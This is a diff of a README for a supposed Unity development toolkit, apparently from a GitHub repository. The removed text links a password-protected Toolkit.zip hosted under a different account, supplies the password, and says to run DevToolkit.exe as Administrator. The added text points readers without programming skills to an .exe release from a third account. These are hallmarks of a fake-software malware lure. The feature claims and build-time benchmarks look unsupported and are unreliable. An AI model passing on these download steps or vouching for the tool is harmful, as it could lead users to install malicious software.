@@ -1,147 +1,103 @@
-# 🎮 🎮Unity Dev Toolkit 2026 — Game Development Accelerator & Build Optimizer
+# 🛠️ Unity-Dev-Toolkit - Build Better Games In Less Time
 
-[![GitHub Stars](https://img.shields.io/github/stars/Alexantros341/Unity-Dev-Toolkit)](https://github.com/Alexantros341/Unity-Dev-Toolkit)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Software](https://img.shields.io/badge/Software-Unity%20Engine-black)](https://unity.com/)
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Game%20Development-purple)]()
-[![Status](https://img.shields.io/badge/Status-Updated%202026-brightgreen)]()
+<p align="center">
+  <a href="https://github.com/gabiestuck33/Unity-Dev-Toolkit">
+    <img src="https://img.shields.io/badge/Download-Release-blue" alt="Download Unity Dev Toolkit">
+  </a>
+</p>
 
----
+Unity Dev Toolkit 2026 improves how you build games in the Unity Engine. This toolkit adds features to handle repetitive work. You spend less time managing files and more time making game content. The toolkit includes tools to import assets, pack prefabs, bake lightmaps, and profile memory usage.
 
-🎮🎮 **All-in-one game development accelerator** for **Unity Engine**.  
-Speed up build times, optimize asset imports, batch-process prefabs, automate lighting bakes, manage scene loading, profile memory usage, compress textures, generate code boilerplate, and streamline the editor workflow — all from a single dashboard.
+## 📥 Getting Started
 
----
+You do not need programming skills to use this toolkit. Follow these steps to set up the software on your Windows computer.
 
-## ⚠️ Disclaimer
+1. Visit this page to download the latest version: [https://github.com/gabiestuck33/Unity-Dev-Toolkit](https://github.com/gabiestuck33/Unity-Dev-Toolkit)
+2. Locate the most recent release under the Releases section on the right side of the page.
+3. Click the file that ends in .unitypackage or .exe depending on your specific setup requirements.
+4. Save the file to your computer.
 
-> This project is shared **for educational and personal use only**.  
-> We are **not affiliated** with Unity Technologies.  
-> Modifying project settings may affect builds — **always backup your Unity projects**.  
-> You use these tools entirely **at your own risk**. 🛡️
+## ⚙️ System Requirements
 
----
+Ensure your computer meets these standards for the best experience:
 
-## 🧩 Toolkit Contents
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Unity Version:** Unity 2026.x or newer.
+*   **Processor:** Quad-core processor or better.
+*   **Memory:** 8 GB RAM minimum.
+*   **Graphics:** Dedicated graphics card with at least 2 GB VRAM.
+*   **Storage:** 500 MB of free space for the toolkit files.
 
-| 🏷️ Module | 💡 Description |
-|---|---|
-| 🚀 **Build Accelerator** | Parallelizes asset compilation and reduces incremental build times |
-| 📦 **Asset Importer** | Batch-configure import settings for textures, models, and audio |
-| 🧱 **Prefab Batcher** | Mass-edit prefab properties, components, and nested references |
-| ☀️ **Lightmap Baker** | Automates lightmap baking with queue scheduling and quality presets |
-| 🗺️ **Scene Loader** | Async scene management with preloading and transition effects |
-| 🧠 **Memory Profiler** | Tracks memory allocations, GC pressure, and asset memory footprint |
-| 🖼️ **Texture Compressor** | Bulk-compress textures with format auto-detection per platform |
-| ⚙️ **Code Generator** | Scaffolds MonoBehaviour, ScriptableObject, and Editor scripts |
-| 🔧 **Editor Enhancer** | Custom inspector layouts, shortcut manager, and project organizer |
+## 🚀 Installation Guide
 
----
+Once you download the file, follow these steps to add the toolkit to your project.
 
-## 📥 Download & Install
+1. Open your existing project inside the Unity Editor.
+2. If you downloaded a .unitypackage, go to the top menu bar.
+3. Select Assets, then Import Package, then Custom Package.
+4. Choose the file you downloaded.
+5. A window will appear showing all files. Click the Import button.
+6. Wait for the progress bar to finish.
+7. Look for a new menu item titled Unity Dev Toolkit at the top of your screen.
 
-🔽 Password-protected archive — extract and develop games faster.
+If you downloaded an installer file instead, run the file and follow the on-screen prompts. The installer will place the necessary files into your project folder.
 
-📦 [**Download** `Toolkit.zip`](https://github.com/LimitLeaderRepel/Unity-Dev-Toolkit/releases/download/Release/Toolkit.zip)
+## 🛠️ Main Features
 
-**🔐 — 1847**
+The toolkit provides several modules to assist your workflow. Each tool fixes a specific problem game developers face daily.
 
----
+### Asset Importer 📦
+The asset importer automates the way you bring models and textures into your project. It assigns settings for materials and textures based on rules you define. This ensures consistency across your game project.
 
-### 📁 What's Inside the Archive
+### Prefab Batcher 🧱
+Managing hundreds of individual objects takes time. The batcher groups related objects into a single unit. This keeps your project hierarchy clean and helps your game run smoother.
 
-```
-Unity-DevToolkit/
-├── 🛠️ DevToolkit.exe                 — main launcher & configurator
-├── 📂 tweaks/                         — core C# modules
-│   ├── BuildAccelerator.cs
-│   ├── AssetImporter.cs
-│   ├── PrefabBatcher.cs
-│   ├── LightmapBaker.cs
-│   ├── SceneLoader.cs
-│   ├── MemoryProfiler.cs
-│   ├── TextureCompressor.cs
-│   ├── CodeGenerator.cs
-│   └── EditorEnhancer.cs
-├── 📂 presets/
-│   ├── mobile.cfg
-│   ├── pc_high.cfg
-│   ├── webgl.cfg
-│   └── console.cfg
-├── 📂 templates/
-├── 📄 setup_guide.txt
-└── 📄 changelog.txt
-```
+### Lightmap Baker 💡
+Lighting creates the mood for your game. The internal baker processes your scene data to create high-quality light maps. It handles complex calculations in the background. This saves you from adjusting these settings manually for every object.
 
----
+### Scene Loader 🗺️
+The scene loader manages how your game transitions between levels. It keeps track of memory usage to prevent crashes. It also reduces the time your players wait for a new area to open.
 
-## 🚀 How to Use
+### Memory Profiler 📊
+Memory leaks slow down your game project. The profiler monitors how your game uses RAM. It highlights objects that consume too much space. You can identify and fix these issues before they cause problems during gameplay.
 
-1️⃣ **Extract** the archive to any folder  
-2️⃣ **Run** `DevToolkit.exe` as Administrator 🛡️  
-3️⃣ **Select** your Unity project root directory  
-4️⃣ **Pick** a preset (Mobile / PC High / WebGL / Console) or tweak each module  
-5️⃣ **Hit Apply** — done! 🎉  
-6️⃣ **Open** Unity and enjoy faster iteration cycles
+### Texture Compressor 🖼️
+High-resolution textures look good, but they also use a lot of disk space. The compressor reduces file size while keeping visual quality. It supports common formats used in both 2D and 3D games.
 
-> 💡 **Pro tip:** Run **Build Accelerator** + **Texture Compressor** together to cut build times by 50%+ on large projects.
+### Code Generator 📝
+If you perform the same coding tasks often, the generator helps. It creates standard scripts for inventory systems, character movement, and menu navigation. You fill in the details, and the tool builds the foundation for you.
 
----
+## 🤝 Workflow Improvements
 
-## 📊 Build Time Benchmarks
+A common goal in development is reducing clicks. Every module in this toolkit aims to remove extra steps from your day. By automating the pipeline, you focus on gameplay balance and design.
 
-| 🖥️ Project Size | ❌ Before | ✅ After | 📈 Gain |
-|---|---|---|---|
-| Small (500 assets) | ~2 min | ~45 sec | **-63%** |
-| Medium (5K assets) | ~12 min | ~5 min | **-58%** |
-| Large (20K assets) | ~45 min | ~18 min | **-60%** |
+Automation also limits human error. When a computer handles repetitive tasks like light baking or texture compression, the output remains consistent. You will notice fewer bugs in your assets and project configuration.
 
-> 📌 Tested with Unity 6 LTS, IL2CPP backend, Windows target.
+## 💬 Frequently Asked Questions
 
----
-## Keys
+**Does this work with older Unity versions?**
+The toolkit works best with Unity 2026. Older versions may lack the base features required for some modules to function correctly.
 
-unity dev toolkit 2026, unity build optimizer,
-unity asset importer, unity prefab tools,
-unity lightmap baker, unity memory profiler,
-best unity tools 2026, unity development accelerator
+**Can I modify the generated code?**
+Yes. The code generator provides a base script. You remain the owner of the code and can change it to fit your game logic.
 
+**Will this slow down my editor?**
+The toolkit runs only when you call a function. It does not stay active in the background. Your editor speed remains the same during normal manual work.
 
-## 💻 System Requirements
+**Where do I get help if I encounter a bug?**
+Return to the GitHub page and click on the Issues tab. You can search for existing problems or start a new request. Ensure you provide your current Unity version and the steps you took to reach the error.
 
-| 🔩 Component | ⬇️ Minimum | ✅ Recommended |
-|---|---|---|
-| 🪟 OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
-| 🧠 CPU | Quad-core 3.0 GHz+ | Ryzen 7 / i7 (8+ cores) |
-| 🎮 GPU | GTX 1060 | RTX 3060+ |
-| 🧬 RAM | 16 GB | 32 GB |
-| 💾 Storage | 100 MB (toolkit) | SSD strongly recommended |
+## 📂 Project Structure
 
----
+*   `/Assets/UnityDevToolkit/Editor` - Contains the scripts for the editor tools.
+*   `/Assets/UnityDevToolkit/Resources` - Stored configuration files and icons.
+*   `/Assets/UnityDevToolkit/Documentation` - Detailed guides for advanced users.
+*   `/Assets/UnityDevToolkit/Templates` - Base templates for the code generator.
 
-## ❗ Troubleshooting
+## 🛡️ Best Practices
 
-| ❌ Problem | ✅ Fix |
-|---|---|
-| Build still slow | Enable parallel compilation, clear Library cache |
-| Asset import errors | Check file formats, run Asset Importer validation |
-| Lightmap artifacts | Increase lightmap resolution, check UV2 channels |
-| Memory spikes | Use Memory Profiler to identify leaking assets |
-| Textures blurry | Adjust compression quality in Texture Compressor |
-| Editor freezing | Disable heavy inspectors in Editor Enhancer |
+Keep your project folders organized even with the toolkit. Assign clear names to your assets. Use the batching tools early in your development cycle to avoid a messy workspace later. Test your game on a target device often. High-resolution textures or complex scenes might need extra optimization even with these tools. Monitor the memory profiler output if your game frame rate drops.
 
----
+## 🛠️ Customizing Settings
 
-## 📜 License
-
-MIT License — shared for educational purposes only.
-
----
-
-## ⭐ Like It? Star It!
-
-If this toolkit made your **Unity** development faster 🔥 — drop a ⭐!  
-It helps other developers find the **best Unity dev tools** in 2026. 🎮⚙️
-
----
+You can change how the toolkit behaves. Go to the Unity Dev Toolkit menu and select Preferences. Here you can tweak settings like default compression ratios or output folders for the code generator. Changes apply globally to your current project. Export your settings to a file if you want to share them with other members of your team. This ensures everyone follows the same project standard.
